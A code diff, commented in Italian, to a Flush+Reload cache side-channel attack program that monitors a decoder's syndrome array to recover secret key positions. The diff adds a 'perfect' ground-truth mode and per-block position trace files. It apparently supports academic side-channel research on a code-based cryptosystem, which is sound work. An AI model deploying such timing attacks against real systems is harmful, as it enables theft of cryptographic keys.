@@ -1,4 +1,4 @@
-/* attack.c - Flush+Reload oracle (stesso processo, sincrono) su syndrome_bits[P].
+/* attack_fr.c - Flush+Reload oracle (stesso processo, sincrono) su syndrome_bits[P].
  *
  * Attacco F+R: richiede memoria condivisa vittima<->attaccante (qui banale,
  * stesso processo). Monitora per-linea l'array della sindrome; gli accessi
@@ -54,6 +54,7 @@ int main(int argc, char **argv)
    }
    uint32_t dom = (P + line_bytes - 1) / line_bytes;
    uint64_t thresh = getenv("THRESH") ? strtoull(getenv("THRESH"),0,10) : 130;
+   int perfect = getenv("PERFECT") != NULL;  /* scrive ground-truth seen (no misura) */
 
    /* --- setup --- */
    static bfkey_t key; static instance_t in;
@@ -76,11 +77,11 @@ int main(int argc, char **argv)
 
    /* file per-blocco della traccia */
    char path[600];
-   FILE *tf[N0];
+   FILE *tf[N0], *pf[N0];
    for (int b=0;b<N0;b++){
-      snprintf(path,sizeof path,"%s/H%d",trace_dir,b);
-      tf[b]=fopen(path,"w");
-      if(!tf[b]){ fprintf(stderr,"non apro %s\n",path); return 1; }
+      snprintf(path,sizeof path,"%s/H%d",trace_dir,b);     tf[b]=fopen(path,"w");
+      snprintf(path,sizeof path,"%s/pos_H%d",trace_dir,b);   pf[b]=fopen(path,"w");
+      if(!tf[b]||!pf[b]){ fprintf(stderr,"non apro file in %s\n",trace_dir); return 1; }
    }
 
    uint8_t *seen   = calloc(dom, 1);
@@ -96,11 +97,11 @@ int main(int argc, char **argv)
          uint32_t row = key.Htr_sparse[b][k] + pos; row -= (row>=P)?P:0;
          seen[row >> shift] = 1;
       }
-      for (uint32_t s=0; s<dom; s++) cflush(&syn[(size_t)s << shift]);
-      asm volatile("mfence");
+      if (!perfect) { for (uint32_t s=0; s<dom; s++) cflush(&syn[(size_t)s << shift]); asm volatile("mfence"); }
       hw = update_syndrome_and_upcs(upc, key.Htr_sparse, v_H_sparse, col, syn, hw);
-      for (uint32_t s=0; s<dom; s++)
+      if (!perfect) for (uint32_t s=0; s<dom; s++)
          if (reload(&syn[(size_t)s << shift]) < thresh) probed[s] = 1;
+      if (perfect) for (uint32_t s=0; s<dom; s++) probed[s] = seen[s];
 
       /* scrivi la riga di traccia nel file del blocco b (ordinata asc) */
       int first = 1;
@@ -112,18 +113,19 @@ int main(int argc, char **argv)
          seen[s]=0; probed[s]=0;
       }
       fprintf(tf[b], "\n");
+      fprintf(pf[b], "%u\n", pos);
 
       gf2x_toggle_coeff(e_out + b*NUM_DIGITS_GF2X_ELEMENT, pos);
       iter++;
    }
-   for (int b=0;b<N0;b++) fclose(tf[b]);
+   for (int b=0;b<N0;b++){ fclose(tf[b]); fclose(pf[b]); }
    free(seen); free(probed);
 
    /* truth per-blocco: linee uniche della chiave, ordinate ascendenti */
    for (int b=0;b<N0;b++){
       uint32_t *lines = malloc(V*sizeof(uint32_t));
       int n=0;
-      for (int k=0;k<V;k++) lines[n++] = key.Htr_sparse[b][k] >> shift;
+      for (int k=0;k<V;k++) lines[n++] = key.Htr_sparse[b][k];  /* bit-res */
       qsort(lines,n,sizeof(uint32_t),cmp_u32);
       snprintf(path,sizeof path,"%s/H%d",truth_dir,b);
       FILE *f=fopen(path,"w");
